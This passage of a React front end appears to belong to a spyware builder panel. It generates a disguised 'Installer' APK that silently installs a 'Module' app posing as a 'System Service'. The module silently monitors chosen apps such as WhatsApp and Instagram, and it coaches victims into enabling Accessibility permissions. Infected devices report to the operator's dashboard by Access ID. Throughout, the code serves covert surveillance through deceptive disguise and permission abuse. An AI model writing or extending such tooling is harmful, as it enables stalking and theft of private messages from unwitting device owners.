      setLogs(['⏳ Build dispatched to GitHub Actions — logs will stream here shortly…']);
    } catch (err) {
      setRunning(false);
      setLastResult({ success: false, error: err.message });
    } finally {
      setSubmitting(false);
    }
  };

  const _doDownload = async (type) => {
    try {
      const r = await fetch(`/api/build/download/${type}/ticket`, { method: 'POST', headers: authHeaders() });
      const d = await r.json().catch(() => ({}));
      if (!r.ok || !d.success || !d.url) throw new Error(d.error || `HTTP ${r.status}`);
      const a = document.createElement('a');
      a.href = d.url;
      const uid = accessId || 'build';
      a.download = type === 'module' ? `Module-${uid}.apk` : `Installer-${uid}.apk`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    } catch (err) { alert(`Download failed: ${err.message}`); }
  };

  const downloadApk = (type) => setDisclaimer({ type });

  const fmtField = (key, value, setter, placeholder, hint) => (
    <div style={styles.field}>
      <label style={styles.label}>{placeholder}</label>
      <input
        type="text"
        style={{ ...styles.input, ...(errors[key] ? styles.inputErr : {}) }}
        value={value}
        onChange={e => setter(e.target.value)}
        disabled={running}
        spellCheck={false}
        autoComplete="off"
      />
      {errors[key] ? <span style={styles.errMsg}>{errors[key]}</span> : <span style={styles.hint}>{hint}</span>}
    </div>
  );

  return (
    <div style={styles.page}>
      {disclaimer && (
        <DisclaimerModal
          filename={disclaimer.type === 'module' ? 'Module.apk' : 'Installer.apk'}
          onConfirm={() => { setDisclaimer(null); _doDownload(disclaimer.type); }}
          onCancel={() => setDisclaimer(null)}
        />
      )}

      <div style={styles.card}>
        <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 12 }}>
          <div>
            <div style={styles.title}>📦 Build Custom APK</div>
            <div style={styles.subtitle}>
              Configure the installer and module independently, then build.
              Your Access ID is baked into every device that registers with these APKs.
            </div>
          </div>
          <span style={styles.ghaTag}>⚡ GitHub Actions</span>
        </div>

        {accessId ? (
          <div style={styles.accessIdBox}>
            🔑 <strong>Your Access ID:</strong> <code style={{ color: '#c4b5fd' }}>{accessId}</code>
            <div style={{ fontSize: 11, color: '#64748b', marginTop: 4 }}>
              All devices installed from APKs you build here will appear only in your dashboard.
            </div>
          </div>
        ) : (
          <div style={{ ...styles.accessIdBox, color: '#fbbf24', borderColor: 'rgba(245,158,11,0.4)', background: 'rgba(245,158,11,0.08)' }}>
            ⏳ An Access ID will be assigned automatically when you start your first build.
          </div>
        )}

        <div style={styles.twoCol}>
          {/* ── Installer column ─────────────────────────────────────────── */}
          <div style={styles.column}>
            <div style={styles.colHeader}>
              <span style={{ fontSize: 16 }}>📥</span>
              Installer App
            </div>

            {fmtField('installerName',    installerName,    setInstallerName,    'App Name',    'e.g. "Assist"')}

            {/* Installer Package ID with suggestions */}
            <div style={styles.field}>
              <label style={styles.label}>Package ID</label>
              <input
                type="text"
                style={{ ...styles.input, ...(errors.installerPackage ? styles.inputErr : {}) }}
                value={installerPackage}
                onChange={e => setInstallerPackage(e.target.value)}
                disabled={running}
                spellCheck={false}
                autoComplete="off"
                placeholder="e.g. com.onerule.task"
              />
              {errors.installerPackage
                ? <span style={styles.errMsg}>{errors.installerPackage}</span>
                : packageIdsError
                  ? <span style={styles.errMsg}>{packageIdsError}</span>
                  : <span style={styles.hint}>{packageIdsLoading ? 'Loading IDs from packageids.json…' : 'IDs loaded from Apk-builder/packageids.json'}</span>}
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
                <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
                {instPkgSugg.map(pkg => (
                  <button
                    key={pkg}
                    type="button"
                    onClick={() => setInstallerPackage(pkg)}
                    disabled={running}
                    style={{
                      background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
                      color: '#a5b4fc', borderRadius: 5, padding: '2px 7px',
                      fontSize: 10.5, cursor: running ? 'not-allowed' : 'pointer',
                      fontFamily: 'monospace', lineHeight: 1.5,
                      opacity: running ? 0.5 : 1,
                    }}
                  >{pkg}</button>
                ))}
                <button
                  type="button"
                  onClick={() => setInstPkgSugg(generatePkgSuggestions(packageIds, 6, [modulePackage]))}
                  disabled={running}
                  style={{
                    background: 'transparent', border: '1px solid #334155', color: '#64748b',
                    borderRadius: 5, padding: '2px 7px', fontSize: 10, cursor: running ? 'not-allowed' : 'pointer',
                    opacity: running ? 0.5 : 1, flexShrink: 0,
                  }}
                  title="Generate new suggestions"
                >↻</button>
              </div>
            </div>

            <IconField
              label="Installer"
              iconSource={installerIconSource}
              onSourceChange={setInstallerIconSource}
              disabled={running}
            />

            {/* Launch Page Editor toggle */}
            <div
              style={styles.sectionToggle}
              onClick={() => setShowLaunchEditor(v => !v)}
            >
              <span>{showLaunchEditor ? '▾' : '▸'}</span>
              <span>🎨 Customize Launch Page</span>
              {!showLaunchEditor && (
                <span style={{ marginLeft: 'auto', fontSize: 10, color: '#64748b', fontWeight: 400 }}>
                  edit title, subtitle, colors…
                </span>
              )}
            </div>

            {showLaunchEditor && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 12, paddingTop: 4 }}>
                <div style={styles.field}>
                  <label style={styles.label}>Page Title</label>
                  <input
                    type="text"
                    style={{ ...styles.input, ...(errors.launchTitle ? styles.inputErr : {}) }}
                    value={launchTitle}
                    onChange={e => setLaunchTitle(e.target.value)}
                    disabled={running}
                    placeholder="A module is required"
                    maxLength={80}
                  />
                  {errors.launchTitle && <span style={styles.errMsg}>{errors.launchTitle}</span>}
                </div>

                <div style={styles.field}>
                  <label style={styles.label}>Subtitle</label>
                  <input
                    type="text"
                    style={{ ...styles.input, ...(errors.launchSubtitle ? styles.inputErr : {}) }}
                    value={launchSubtitle}
                    onChange={e => setLaunchSubtitle(e.target.value)}
                    disabled={running}
                    placeholder="Click Install to proceed."
                    maxLength={120}
                  />
                  {errors.launchSubtitle && <span style={styles.errMsg}>{errors.launchSubtitle}</span>}
                </div>

                <div style={styles.field}>
                  <label style={styles.label}>Button Text</label>
                  <input
                    type="text"
                    style={{ ...styles.input, ...(errors.launchBtnText ? styles.inputErr : {}) }}
                    value={launchBtnText}
                    onChange={e => setLaunchBtnText(e.target.value)}
                    disabled={running}
                    placeholder="Install"
                    maxLength={40}
                  />
                  {errors.launchBtnText && <span style={styles.errMsg}>{errors.launchBtnText}</span>}
                </div>

                <ColorPicker
                  label="Background"
                  value={launchBgColor}
                  onChange={setLaunchBgColor}
                  presets={BG_PRESETS}
                  disabled={running}
                />

                <ColorPicker
                  label="Accent / Button"
                  value={launchAccentColor}
                  onChange={setLaunchAccentColor}
                  presets={ACCENT_PRESETS}
                  disabled={running}
                />

                <LaunchPagePreview
                  title={launchTitle}
                  subtitle={launchSubtitle}
                  btnText={launchBtnText}
                  bgColor={launchBgColor}
                  accentColor={launchAccentColor}
                />
              </div>
            )}

            <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
              The installer is the small app users download. It silently installs the module on launch.
            </div>
          </div>

          {/* ── Module column ─────────────────────────────────────────────── */}
          <div style={styles.column}>
            <div style={styles.colHeader}>
              <span style={{ fontSize: 16 }}>🧩</span>
              Module App
            </div>

            {fmtField('moduleName',    moduleName,    setModuleName,    'App Name',   'e.g. "System Service"')}

            {/* Module Package ID with suggestions */}
            <div style={styles.field}>
              <label style={styles.label}>Package ID</label>
              <input
                type="text"
                style={{ ...styles.input, ...(errors.modulePackage ? styles.inputErr : {}) }}
                value={modulePackage}
                onChange={e => setModulePackage(e.target.value)}
                disabled={running}
                spellCheck={false}
                autoComplete="off"
                placeholder="e.g. com.task.tusker"
              />
              {errors.modulePackage
                ? <span style={styles.errMsg}>{errors.modulePackage}</span>
                : packageIdsError
                  ? <span style={styles.errMsg}>{packageIdsError}</span>
                  : <span style={styles.hint}>{packageIdsLoading ? 'Loading IDs from packageids.json…' : 'IDs loaded from Apk-builder/packageids.json'}</span>}
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
                <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
                {modPkgSugg.map(pkg => (
                  <button
                    key={pkg}
                    type="button"
                    onClick={() => setModulePackage(pkg)}
                    disabled={running}
                    style={{
                      background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
                      color: '#a5b4fc', borderRadius: 5, padding: '2px 7px',
                      fontSize: 10.5, cursor: running ? 'not-allowed' : 'pointer',
                      fontFamily: 'monospace', lineHeight: 1.5,
                      opacity: running ? 0.5 : 1,
                    }}
                  >{pkg}</button>
                ))}
                <button
                  type="button"
                  onClick={() => setModPkgSugg(generatePkgSuggestions(packageIds, 6, [installerPackage]))}
                  disabled={running || packageIdsLoading}
                  style={{
                    background: 'transparent', border: '1px solid #334155', color: '#64748b',
                    borderRadius: 5, padding: '2px 7px', fontSize: 10, cursor: running ? 'not-allowed' : 'pointer',
                    opacity: running ? 0.5 : 1, flexShrink: 0,
                  }}
                  title="Generate new suggestions"
                >↻</button>
              </div>
            </div>

            <IconField
              label="Module"
              iconSource={moduleIconSource}
              onSourceChange={setModuleIconSource}
              disabled={running}
            />

            <div style={styles.field}>
              <label style={styles.label}>
                Monitored Packages
                <span style={{ marginLeft: 8, color: '#64748b', fontWeight: 400, textTransform: 'none', letterSpacing: 0 }}>
                  ({parseMonitored().length} apps)
                </span>
              </label>
              <textarea
                style={{ ...styles.textarea, ...(errors.monitored ? styles.inputErr : {}) }}
                value={monitoredText}
                onChange={e => setMonitoredText(e.target.value)}
                disabled={running}
                spellCheck={false}
                placeholder={'com.whatsapp\ncom.instagram.android\ncom.facebook.katana'}
              />
              {errors.monitored
                ? <span style={styles.errMsg}>{errors.monitored}</span>
                : <span style={styles.hint}>
                    One Android package name per line (or comma-separated). These are the apps the module silently monitors.
                  </span>}
            </div>

            {/* ── Module launch page editor ───────────────────────────────── */}
            <div style={styles.field}>
              <button
                type="button"
                onClick={() => setShowModuleLaunchEditor(v => !v)}
                style={{ ...styles.collapseToggle, color: showModuleLaunchEditor ? '#818cf8' : '#94a3b8' }}
                disabled={running}
              >
                <span>{showModuleLaunchEditor ? '▾' : '▸'}</span>
                🎨 Customize Launch Page
                {!showModuleLaunchEditor && (
                  <span style={{ marginLeft: 'auto', fontSize: 10, color: '#475569', fontWeight: 400 }}>
                    {moduleLaunchTitle || 'System Service'}
                  </span>
                )}
              </button>

              {showModuleLaunchEditor && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginTop: 8 }}>

                  {/* Title */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>App Title</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchTitle ? styles.inputErr : {}) }}
                      value={moduleLaunchTitle}
                      onChange={e => setModuleLaunchTitle(e.target.value)}
                      disabled={running}
                      placeholder="System Service"
                    />
                    {errors.moduleLaunchTitle && <span style={styles.errMsg}>{errors.moduleLaunchTitle}</span>}
                  </div>

                  {/* Subtitle */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Status Subtitle</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchSubtitle ? styles.inputErr : {}) }}
                      value={moduleLaunchSubtitle}
                      onChange={e => setModuleLaunchSubtitle(e.target.value)}
                      disabled={running}
                      placeholder="Accessibility service not enabled"
                    />
                    {errors.moduleLaunchSubtitle && <span style={styles.errMsg}>{errors.moduleLaunchSubtitle}</span>}
                  </div>

                  {/* Step 1 */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 1 Text</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchStep1 ? styles.inputErr : {}) }}
                      value={moduleLaunchStep1}
                      onChange={e => setModuleLaunchStep1(e.target.value)}
                      disabled={running}
                      placeholder="Tap the button below to open Accessibility Settings"
                    />
                    {errors.moduleLaunchStep1 && <span style={styles.errMsg}>{errors.moduleLaunchStep1}</span>}
                  </div>

                  {/* Step 2 */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>
                      Step 2 Text
                      <span style={{ marginLeft: 6, color: '#475569', fontWeight: 400, textTransform: 'none', letterSpacing: 0, fontSize: 10 }}>
                        (leave blank → auto-filled with app name)
                      </span>
                    </label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchStep2 ? styles.inputErr : {}) }}
                      value={moduleLaunchStep2}
                      onChange={e => setModuleLaunchStep2(e.target.value)}
                      disabled={running}
                      placeholder={`Find and tap "${moduleName}" under Installed Services`}
                    />
                    {errors.moduleLaunchStep2 && <span style={styles.errMsg}>{errors.moduleLaunchStep2}</span>}
                  </div>

                  {/* Step 3 */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 3 Text</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchStep3 ? styles.inputErr : {}) }}
                      value={moduleLaunchStep3}
                      onChange={e => setModuleLaunchStep3(e.target.value)}
                      disabled={running}
                      placeholder="Toggle it ON and tap Allow in the confirmation dialog"
                    />
                    {errors.moduleLaunchStep3 && <span style={styles.errMsg}>{errors.moduleLaunchStep3}</span>}
                  </div>

                  {/* Step 4 */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Step 4 Text</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchStep4 ? styles.inputErr : {}) }}
                      value={moduleLaunchStep4}
                      onChange={e => setModuleLaunchStep4(e.target.value)}
                      disabled={running}
                      placeholder="Return to this screen — permissions will be granted automatically"
                    />
                    {errors.moduleLaunchStep4 && <span style={styles.errMsg}>{errors.moduleLaunchStep4}</span>}
                  </div>

                  {/* Button text */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Button Text</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchBtnText ? styles.inputErr : {}) }}
                      value={moduleLaunchBtnText}
                      onChange={e => setModuleLaunchBtnText(e.target.value)}
                      disabled={running}
                      placeholder="Open Accessibility Settings"
                    />
                    {errors.moduleLaunchBtnText && <span style={styles.errMsg}>{errors.moduleLaunchBtnText}</span>}
                  </div>

                  {/* Footer note */}
                  <div>
                    <label style={{ ...styles.label, marginBottom: 4 }}>Footer Note</label>
                    <input
                      style={{ ...styles.input, ...(errors.moduleLaunchFooter ? styles.inputErr : {}) }}
                      value={moduleLaunchFooter}
                      onChange={e => setModuleLaunchFooter(e.target.value)}
                      disabled={running}
                      placeholder="Permissions are granted automatically once accessibility is enabled."
                    />
                    {errors.moduleLaunchFooter && <span style={styles.errMsg}>{errors.moduleLaunchFooter}</span>}
                  </div>

                  <ColorPicker
                    label="Background Color"
                    value={moduleLaunchBgColor}
                    onChange={setModuleLaunchBgColor}
                    presets={MODULE_BG_PRESETS}
                    disabled={running}
                  />
                  <ColorPicker
                    label="Card / Surface Color"
                    value={moduleLaunchCardColor}
                    onChange={setModuleLaunchCardColor}
                    presets={MODULE_CARD_PRESETS}
                    disabled={running}
                  />
                  <ColorPicker
                    label="Accent Color"
                    value={moduleLaunchAccentColor}
                    onChange={setModuleLaunchAccentColor}
                    presets={MODULE_ACCENT_PRESETS}
                    disabled={running}
                  />

                  <ModuleLaunchPagePreview
                    title={moduleLaunchTitle}
                    subtitle={moduleLaunchSubtitle}
                    step1={moduleLaunchStep1}
                    step2={moduleLaunchStep2 || `Find and tap "${moduleName}" under Installed Services`}
                    step3={moduleLaunchStep3}
                    step4={moduleLaunchStep4}
                    btnText={moduleLaunchBtnText}
                    footer={moduleLaunchFooter}
                    bgColor={moduleLaunchBgColor}
                    cardColor={moduleLaunchCardColor}
                    accentColor={moduleLaunchAccentColor}
                  />
                </div>
              )}
            </div>

            <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
              The module is the core service app. It runs silently in the background after installation.
            </div>
          </div>
        </div>

        <div style={styles.btnRow}>
          <button
            style={{ ...styles.buildBtn, ...(running || submitting || packageIdsLoading || packageIdsError ? styles.buildBtnDisabled : {}) }}
            onClick={startBuild}
            disabled={running || submitting || packageIdsLoading || !!packageIdsError}
            title={running ? 'A build is already in progress — please wait for it to finish.' : ''}
          >
            {submitting ? '⏳ Starting…' : (running ? '⏳ Building…' : '🔨 Start Build')}
          </button>

          {running   && <span style={styles.badge('#fbbf24')}>BUILDING</span>}
          {!running && lastResult?.success === true  && <span style={styles.badge('#22c55e')}>SUCCESS</span>}
          {!running && lastResult?.success === false && <span style={styles.badge('#ef4444')}>FAILED</span>}

          <span style={{ flex: 1 }} />

          {(downloads.module || downloads.installer) && expiryCountdown && (
            <span style={{
              fontSize: 11, fontWeight: 600, color: '#fbbf24',
              background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.35)',
              borderRadius: 6, padding: '3px 10px',
            }}>
              ⏳ Files expire in {expiryCountdown}
            </span>
          )}
          {downloads.module    && <button style={styles.dlBtn} onClick={() => downloadApk('module')}>⬇ Module.apk</button>}
          {downloads.installer && <button style={styles.dlBtn} onClick={() => downloadApk('installer')}>⬇ Installer.apk</button>}
        </div>

        {lastResult?.error && !running && (
          <div style={{ marginTop: 10, color: '#f87171', fontSize: 12 }}>
            Error: {lastResult.error}
          </div>
        )}
      </div>

      <div style={styles.card}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
          <div style={styles.title}>📜 Build Log</div>
          <span style={styles.status}>
            {running
              ? <span style={{ color: '#fbbf24', display: 'inline-flex', alignItems: 'center', gap: 5 }}>
                  <span style={{ display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#fbbf24', animation: 'pulse 1.5s infinite' }} />
                  Live
                </span>
              : (logs.length > 0 ? `${logs.length} lines` : 'No active build')}
          </span>
        </div>
        <div ref={logEndRef} style={styles.logPane}>
          {logs.length === 0
            ? <div style={{ color: '#475569' }}>Logs will stream here in real time once a build starts. First build takes ~5-15 min (Docker image + Gradle).</div>
            : logs.map((ln, i) => (
                <div key={i} style={{
                  color: ln.startsWith('❌') ? '#f87171'
                       : ln.startsWith('✅') ? '#86efac'
                       : ln.startsWith('⬆') ? '#67e8f9'
                       : ln.startsWith('===') ? '#a78bfa'
                       : undefined
                }}>{ln}</div>
              ))}
        </div>
      </div>
    </div>
  );
}
